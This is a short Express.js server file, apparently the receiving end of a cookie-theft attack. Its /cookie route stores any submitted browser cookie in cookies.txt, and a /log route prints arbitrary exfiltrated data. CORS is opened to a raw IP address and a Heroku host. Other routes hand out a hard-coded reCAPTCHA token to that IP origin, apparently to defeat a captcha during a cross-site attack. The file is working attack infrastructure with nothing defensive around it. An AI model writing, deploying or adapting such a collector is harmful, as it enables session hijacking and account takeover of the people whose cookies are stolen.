'use strict';

//modules
var fs = require('fs');

// setup express
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');
const port = process.env.PORT || 3000;

// packages for express
app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
 extended: true})); 
 app.use(cors({
    origin: ['http://65.21.255.24/', 'https://cookie-monster-jfam.herokuapp.com/', 'http://cookie-monster-jfam.herokuapp.com/']
}));

var cookieFunc = function(cookie){
    fs.appendFile('cookies.txt', cookie, function (err){
        if(err) throw err;
        console.log("Saved cookie " + cookie + " to file.");
    });
}

app.get('/', (req, res)=>{
    res.sendFile('./index.html', { root : __dirname});
});

app.post('/cookie', (req, res)=>{
    cookieFunc(req.body.cookie);
    res.send('<h1>Posted!</h1>');
});

app.post('/log', (req, res)=>{
    console.log(req.body.log);
    res.sendStatus(200);
});

app.post('/checkbody',(req,res)=>{
	const resp = req.body['g-recaptcha-response'];
    res.set('Access-Control-Allow-Origin','http://65.21.255.24:5000');
    res.set('Access-Control-Allow-Credentials', true);
	res.type('txt');
	if(!resp) return res.send('??');
    return res.send('ok');
});

app.get('/data',(req,res)=>{
    const params = "g-recaptcha-response=03AGdBq24dYeWeOoyYf18ehkJjmZbNl55YTBMM4J7S80wjSsslIxtjPjnsH2jTR0g9LDX43E4xyt3cjE3Nwmbc4WXB1UrlxatfBP6fqxrxjBROHEsBruHvtnmaJQ8Azned88xqjsPgMuBm6TZU41UUQpp8ew32z9_xK7ITV8o4tyKCVjqy5hh8wmKMwmr1NFeDb63uthp7VN5pPijnuvZs3bk14Ou9ocZv7Ok5rlVcAvmq5mDCQLDQDXt_oC68fNR4sZQMcGta2RYhoIFr-YLw_48GoO9aLaBoFj5wZ8VJS_jJ72r_U0-sV5z-XyyTuo9Bx0b5Pftw1KOM5eKSZj6UOQ_Q5J-YBCc1DSHQoGjkAyx721yoZhKsjM_JXzBeIYGP8YDkHklWm6zhdniE4vh3aR7hMTEEmfIPq6TW9cU5FE6K2GihVePAZrcTqlfuqcIQ3CLdbxTavVGY";
    res.set('Access-Control-Allow-Origin','http://65.21.255.24:5000');
    res.set('Access-Control-Allow-Credentials', true);
    res.send(params);
});

app.listen(port, ()=>{
    console.log("Running on " + port);
})